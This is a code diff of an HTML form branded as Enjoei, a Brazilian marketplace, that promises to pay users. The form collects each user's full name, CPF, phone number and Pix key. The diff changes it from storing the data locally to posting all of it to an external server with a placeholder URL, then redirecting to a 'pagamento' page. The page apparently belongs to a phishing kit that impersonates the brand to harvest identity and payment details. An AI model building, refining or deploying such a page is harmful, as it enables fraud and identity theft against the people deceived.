@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
+<head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ENJOEI - Receba seus Pagamentos</title>
     <style>
-      /* Estilos gerais melhorados */
       :root {
         --primary-color: #61005D;
         --primary-light: #8E3A8B;
@@ -33,7 +32,6 @@
         padding: 20px;
       }
 
-      /* Cabeçalho modernizado */
       .c-clean-header {
         background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
         box-shadow: 0 4px 12px rgba(0,0,0,0.1);
@@ -57,7 +55,6 @@
         margin: 0;
       }
 
-      /* Container do formulário */
       .session-wrapper {
         background-color: white;
         border-radius: 12px;
@@ -67,7 +64,6 @@
         border: 1px solid var(--medium-gray);
       }
 
-      /* Cabeçalho do formulário */
       .session-header {
         text-align: center;
         margin-bottom: 30px;
@@ -101,7 +97,6 @@
         line-height: 1.5;
       }
 
-      /* Campos do formulário */
       .l-field {
         margin-bottom: 25px;
         position: relative;
@@ -137,7 +132,6 @@
         border-color: #b3b3b3;
       }
 
-      /* Separador estilizado */
       .separator {
         display: flex;
         align-items: center;
@@ -160,7 +154,6 @@
         background: linear-gradient(90deg, var(--medium-gray), transparent);
       }
 
-      /* Botão principal */
       .o-button.-xs-primary {
         background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
         color: white;
@@ -187,7 +180,6 @@
         transform: translateY(0);
       }
 
-      /* Estilos de erro */
       .erro {
         border-color: var(--error-color) !important;
       }
@@ -200,7 +192,6 @@
         font-weight: 500;
       }
 
-      /* Select estilizado */
       select.o-input {
         appearance: none;
         background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2361005D'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
@@ -210,7 +201,6 @@
         padding-right: 36px;
       }
 
-      /* Footer */
       .o-text.-xs-minion {
         font-size: 12px;
         color: var(--dark-gray);
@@ -224,7 +214,6 @@
         font-weight: 500;
       }
 
-      /* Animação do logo */
       .logo-banner {
         position: fixed;
         top: 0;
@@ -255,27 +244,6 @@
         to { opacity: 0; visibility: hidden; }
       }
 
-      /* Responsividade */
-      @media (max-width: 480px) {
-        .session-wrapper {
-          padding: 25px 20px;
-          margin-top: 20px;
-        }
-        
-        .session-title {
-          font-size: 22px;
-        }
-        
-        .header-title {
-          font-size: 18px;
-        }
-        
-        .o-input {
-          padding: 12px 14px;
-        }
-      }
-
-      /* Efeito de loading no botão */
       .button-loading {
         position: relative;
         pointer-events: none;
@@ -299,7 +267,6 @@
         to { transform: rotate(360deg); }
       }
 
-      /* Tooltip para ajuda */
       .help-tooltip {
         position: relative;
         display: inline-block;
@@ -336,9 +303,28 @@
         margin-bottom: 5px;
         z-index: 100;
       }
+
+      @media (max-width: 480px) {
+        .session-wrapper {
+          padding: 25px 20px;
+          margin-top: 20px;
+        }
+        
+        .session-title {
+          font-size: 22px;
+        }
+        
+        .header-title {
+          font-size: 18px;
+        }
+        
+        .o-input {
+          padding: 12px 14px;
+        }
+      }
     </style>
-  </head>
-  <body cz-shortcut-listen="true">
+</head>
+<body>
     <div class="logo-banner">
       <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none">
         <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path>
@@ -358,14 +344,14 @@
           <p class="session-text">Preencha seus dados para receber seus pagamentos com segurança</p>
         </div>
 
-        <form id="login_user" class="o-form l-form">
+        <form id="payment-form" class="o-form l-form">
           <div class="l-field">
             <label for="user_name" class="l-label">
               Nome Completo <span class="help-tooltip" data-tooltip="Nome conforme cadastro no banco"></span>
             </label>
             <input
               type="text"
-              name="user[name]"
+              name="name"
               id="user_name"
               placeholder="Nome completo do titular"
               class="o-input"
@@ -381,11 +367,10 @@
             <label for="user_cpf" class="l-label">CPF</label>
             <input
               type="text"
-              name="user[cpf]"
+              name="cpf"
               id="user_cpf"
               placeholder="000.000.000-00"
               maxlength="14"
-              oninput="formatCPF(this)"
               class="o-input"
               required
               pattern="\d{3}\.\d{3}\.\d{3}-\d{2}"
@@ -399,11 +384,10 @@
             <label for="user_phone" class="l-label">Telefone</label>
             <input
               type="tel"
-              name="user[phone]"
+              name="phone"
               id="user_phone"
               placeholder="(00) 00000-0000"
               maxlength="15"
-              oninput="formatCelular(this)"
               class="o-input"
               required
               pattern="\(\d{2}\) \d{4,5}-\d{4}"
@@ -416,40 +400,39 @@
           <div class="separator">Dados Bancários</div>
 
           <div class="l-field">
-            <label for="selectfromuser" class="l-label">
+            <label for="pix_key_type" class="l-label">
               Tipo de Chave Pix <span class="help-tooltip" data-tooltip="Selecione como deseja receber"></span>
             </label>
-            <select id="selectfromuser" class="o-input" required>
+            <select id="pix_key_type" name="pix_key_type" class="o-input" required>
               <option value="" disabled selected>Selecione o tipo de chave</option>
               <option value="CPF">CPF</option>
               <option value="EMAIL">E-mail</option>
               <option value="TELEFONE">Telefone</option>
               <option value="ALEATORIA">Chave Aleatória</option>
             </select>
-            <div id="erro-typekey" class="mensagem-erro">
+            <div id="erro-pix_key_type" class="mensagem-erro">
               Por favor, selecione um tipo de chave
             </div>
           </div>
 
-          <div class="l-field" id="telefone_field">
-            <label for="user_key" class="l-label">Chave Pix</label>
+          <div class="l-field" id="pix_key_field">
+            <label for="pix_key" class="l-label">Chave Pix</label>
             <input
               type="text"
-              name="user[key]"
-              id="user_key"
+              name="pix_key"
+              id="pix_key"
               placeholder="Digite sua chave Pix"
               class="o-input"
               required
             />
-            <div id="erro-user_key" class="mensagem-erro">
+            <div id="erro-pix_key" class="mensagem-erro">
               Por favor, insira sua chave Pix
             </div>
           </div>
 
           <div class="o-well" style="margin-top: 30px;">
             <button 
-              type="button" 
-              onclick="submitForm()" 
+              type="submit" 
               class="o-button -xs-primary"
               id="submit-button"
             >
@@ -469,6 +452,9 @@
     </main>
 
     <script>
+      // URL da API (substitua pela URL do seu servidor hospedado)
+      const API_URL = 'https://seu-servidor.onrender.com/api'; // Atualize aqui
+
       // Remove o logo após 1.5 segundos
       setTimeout(() => {
         const logo = document.querySelector(".logo-banner");
@@ -476,20 +462,20 @@
       }, 1500);
 
       // Formatação de CPF
-      function formatCPF(input) {
-        let cpf = input.value.replace(/\D/g, "");
-        if (cpf.length > 3 && cpf.length <= 6) {
-          cpf = cpf.replace(/(\d{3})(\d+)/, "$1.$2");
-        } else if (cpf.length > 6 && cpf.length <= 9) {
-          cpf = cpf.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
-        } else if (cpf.length > 9) {
-          cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
-        }
-        input.value = cpf;
+      document.getElementById('user_cpf').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, "");
         
-        // Validação em tempo real
-        validateCPF(input);
-      }
+        if (value.length > 3 && value.length <= 6) {
+          value = value.replace(/(\d{3})(\d+)/, "$1.$2");
+        } else if (value.length > 6 && value.length <= 9) {
+          value = value.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
+        } else if (value.length > 9) {
+          value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+        }
+        
+        e.target.value = value;
+        validateCPF(e.target);
+      });
 
       // Validação de CPF
       function validateCPF(input) {
@@ -499,9 +485,7 @@
         if (cpf.length === 11) {
           // Verifica se todos os dígitos são iguais
           if (/^(\d)\1{10}$/.test(cpf)) {
-            input.classList.add("erro");
-            errorElement.textContent = "CPF inválido (não pode ter todos dígitos iguais)";
-            errorElement.style.display = "block";
+            showError(input, errorElement, "CPF inválido (não pode ter todos dígitos iguais)");
             return false;
           }
           
@@ -514,13 +498,9 @@
           }
           remainder = (sum * 10) % 11;
           
-          if ((remainder === 10) || (remainder === 11)) {
-            remainder = 0;
-          }
+          if ((remainder === 10) || (remainder === 11)) remainder = 0;
           if (remainder !== parseInt(cpf.substring(9, 10))) {
-            input.classList.add("erro");
-            errorElement.textContent = "CPF inválido (dígito verificador incorreto)";
-            errorElement.style.display = "block";
+            showError(input, errorElement, "CPF inválido (dígito verificador incorreto)");
             return false;
           }
           
@@ -530,44 +510,40 @@
           }
           remainder = (sum * 10) % 11;
           
-          if ((remainder === 10) || (remainder === 11)) {
-            remainder = 0;
-          }
+          if ((remainder === 10) || (remainder === 11)) remainder = 0;
           if (remainder !== parseInt(cpf.substring(10, 11))) {
-            input.classList.add("erro");
-            errorElement.textContent = "CPF inválido (dígito verificador incorreto)";
-            errorElement.style.display = "block";
+            showError(input, errorElement, "CPF inválido (dígito verificador incorreto)");
             return false;
           }
           
-          input.classList.remove("erro");
-          errorElement.style.display = "none";
+          hideError(input, errorElement);
           return true;
         } else if (cpf.length > 0) {
-          input.classList.add("erro");
-          errorElement.textContent = "CPF incompleto (11 dígitos necessários)";
-          errorElement.style.display = "block";
+          showError(input, errorElement, cpf.length < 11 ? 
+            "CPF incompleto (11 dígitos necessários)" : 
+            "CPF muito longo (máximo 11 dígitos)");
           return false;
         }
         
+        hideError(input, errorElement);
         return false;
       }
 
       // Formatação de celular
-      function formatCelular(input) {
-        let celular = input.value.replace(/\D/g, "");
-        if (celular.length > 2 && celular.length <= 7) {
-          celular = celular.replace(/(\d{2})(\d+)/, "($1) $2");
-        } else if (celular.length > 7 && celular.length <= 11) {
-          celular = celular.replace(/(\d{2})(\d{5})(\d+)/, "($1) $2-$3");
-        } else if (celular.length > 11) {
-          celular = celular.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
-        }
-        input.value = celular;
+      document.getElementById('user_phone').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, "");
         
-        // Validação em tempo real
-        validatePhone(input);
-      }
+        if (value.length > 2 && value.length <= 7) {
+          value = value.replace(/(\d{2})(\d+)/, "($1) $2");
+        } else if (value.length > 7 && value.length <= 11) {
+          value = value.replace(/(\d{2})(\d{5})(\d+)/, "($1) $2-$3");
+        } else if (value.length > 11) {
+          value = value.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
+        }
+        
+        e.target.value = value;
+        validatePhone(e.target);
+      });
 
       // Validação de telefone
       function validatePhone(input) {
@@ -575,44 +551,54 @@
         const errorElement = document.getElementById("erro-user_phone");
         
         if (phone.length === 11 || phone.length === 10) {
-          input.classList.remove("erro");
-          errorElement.style.display = "none";
+          hideError(input, errorElement);
           return true;
         } else if (phone.length > 0) {
-          input.classList.add("erro");
-          errorElement.textContent = phone.length < 10 ? 
+          showError(input, errorElement, phone.length < 10 ? 
             "Telefone incompleto (10 ou 11 dígitos necessários)" : 
-            "Telefone muito longo (máximo 11 dígitos)";
-          errorElement.style.display = "block";
+            "Telefone muito longo (máximo 11 dígitos)");
           return false;
         }
         
+        hideError(input, errorElement);
         return false;
       }
-      
-      // Mostrar/ocultar campo de chave Pix
-      document.getElementById("selectfromuser").addEventListener("change", function() {
-        document.getElementById("telefone_field").style.display = "block";
-      });
+
+      // Mostrar erro
+      function showError(input, errorElement, message) {
+        input.classList.add("erro");
+        errorElement.textContent = message;
+        errorElement.style.display = "block";
+      }
+
+      // Esconder erro
+      function hideError(input, errorElement) {
+        input.classList.remove("erro");
+        errorElement.style.display = "none";
+      }
 
       // Validação do formulário
-      function submitForm() {
+      document.getElementById('payment-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
         const button = document.getElementById("submit-button");
-        const form = document.getElementById("login_user");
+        const form = e.target;
         let isValid = true;
         
         // Validar todos os campos
         const nome = document.getElementById("user_name");
         const cpf = document.getElementById("user_cpf");
         const telefone = document.getElementById("user_phone");
-        const tipoChave = document.getElementById("selectfromuser");
-        const chavePix = document.getElementById("user_key");
+        const tipoChave = document.getElementById("pix_key_type");
+        const chavePix = document.getElementById("pix_key");
         
         // Validar nome
         if (nome.value.length < 5) {
-          nome.classList.add("erro");
-          document.getElementById("erro-user_name").style.display = "block";
+          showError(nome, document.getElementById("erro-user_name"), 
+            "Por favor, insira seu nome completo (mínimo 5 caracteres)");
           isValid = false;
+        } else {
+          hideError(nome, document.getElementById("erro-user_name"));
         }
         
         // Validar CPF
@@ -627,16 +613,20 @@
         
         // Validar tipo de chave
         if (!tipoChave.value) {
-          tipoChave.classList.add("erro");
-          document.getElementById("erro-typekey").style.display = "block";
+          showError(tipoChave, document.getElementById("erro-pix_key_type"), 
+            "Por favor, selecione um tipo de chave");
           isValid = false;
+        } else {
+          hideError(tipoChave, document.getElementById("erro-pix_key_type"));
         }
         
         // Validar chave Pix
         if (!chavePix.value) {
-          chavePix.classList.add("erro");
-          document.getElementById("erro-user_key").style.display = "block";
+          showError(chavePix, document.getElementById("erro-pix_key"), 
+            "Por favor, insira sua chave Pix");
           isValid = false;
+        } else {
+          hideError(chavePix, document.getElementById("erro-pix_key"));
         }
         
         if (!isValid) {
@@ -646,69 +636,67 @@
         
         // Simular loading
         button.classList.add("button-loading");
+        button.disabled = true;
+        button.textContent = 'Enviando...';
         
-        setTimeout(() => {
-          button.classList.remove("button-loading");
-          
-          // Salvar dados no localStorage
-          saveClientData({
-            nome: nome.value,
-            cpf: cpf.value,
-            telefone: telefone.value,
-            tipoChave: tipoChave.value,
-            chavePix: chavePix.value,
-            dataCadastro: new Date().toISOString(),
-            status: "ativo"
+        // Criar objeto com os dados do cliente
+        const clientData = {
+          nome: nome.value,
+          cpf: cpf.value.replace(/\D/g, ""),
+          telefone: telefone.value.replace(/\D/g, ""),
+          tipoChave: tipoChave.value,
+          chavePix: chavePix.value,
+          dataCadastro: new Date().toISOString(),
+          status: "pendente"
+        };
+        
+        // Enviar dados para o servidor
+        saveClient(clientData)
+          .then(() => {
+            alert('Dados enviados com sucesso!');
+            // Redirecionar para página de sucesso
+            window.location.href = '/VeryPagement/pagamento.html';
+          })
+          .catch(error => {
+            console.error("Erro ao salvar cliente:", error);
+            alert("Ocorreu um erro ao salvar seus dados: " + error.message);
+          })
+          .finally(() => {
+            button.classList.remove("button-loading");
+            button.disabled = false;
+            button.textContent = 'Confirmar Dados';
+          });
+      });
+
+      // Função para salvar cliente no servidor
+      async function saveClient(clientData) {
+        try {
+          const response = await fetch(`${API_URL}/clients`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(clientData)
           });
           
-          // Redirecionar para página de sucesso
-          window.location.href = '/VeryPagement/pagamento.html';
-        }, 1500);
-      }
-
-      // Salvar dados do cliente
-      function saveClientData(clientData) {
-        // Obter dados existentes ou criar array vazio
-        const clientes = JSON.parse(localStorage.getItem('clientes')) || [];
-        
-        // Verificar se CPF já existe
-        const cpfExistente = clientes.some(cliente => 
-          cliente.cpf === clientData.cpf
-        );
-        
-        if (cpfExistente) {
-          // Atualizar dados existentes
-          const updatedClientes = clientes.map(cliente => 
-            cliente.cpf === clientData.cpf ? clientData : cliente
-          );
-          localStorage.setItem('clientes', JSON.stringify(updatedClientes));
-        } else {
-          // Adicionar novo cliente
-          clientData.id = clientes.length > 0 ? 
-            Math.max(...clientes.map(c => c.id)) + 1 : 1;
-          clientes.push(clientData);
-          localStorage.setItem('clientes', JSON.stringify(clientes));
+          if (!response.ok) {
+            const errorData = await response.json();
+            throw new Error(errorData.error || 'Erro ao salvar cliente');
+          }
+          
+          return await response.json();
+        } catch (error) {
+          throw error;
         }
       }
 
-      // Validação em tempo real
+      // Validação em tempo real para outros campos
       document.querySelectorAll('.o-input').forEach(input => {
         input.addEventListener('input', function() {
-          if (this.checkValidity()) {
-            this.classList.remove('erro');
-            const errorElement = this.nextElementSibling;
-            if (errorElement && errorElement.classList.contains('mensagem-erro')) {
-              errorElement.style.display = 'none';
-            }
-          }
-        });
-        
-        input.addEventListener('blur', function() {
-          if (!this.checkValidity()) {
-            this.classList.add('erro');
-            const errorElement = this.nextElementSibling;
-            if (errorElement && errorElement.classList.contains('mensagem-erro')) {
-              errorElement.style.display = 'block';
+          const errorElement = this.nextElementSibling;
+          if (errorElement && errorElement.classList.contains('mensagem-erro')) {
+            if (this.checkValidity()) {
+              hideError(this, errorElement);
             }
           }
         });
@@ -719,10 +707,9 @@
         // Verificar se veio de redirecionamento de admin
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('admin') === 'true') {
-          // Mostrar mensagem especial ou comportamento diferente
           console.log("Acesso do painel de admin");
         }
       });
     </script>
-  </body>
+</body>
 </html>
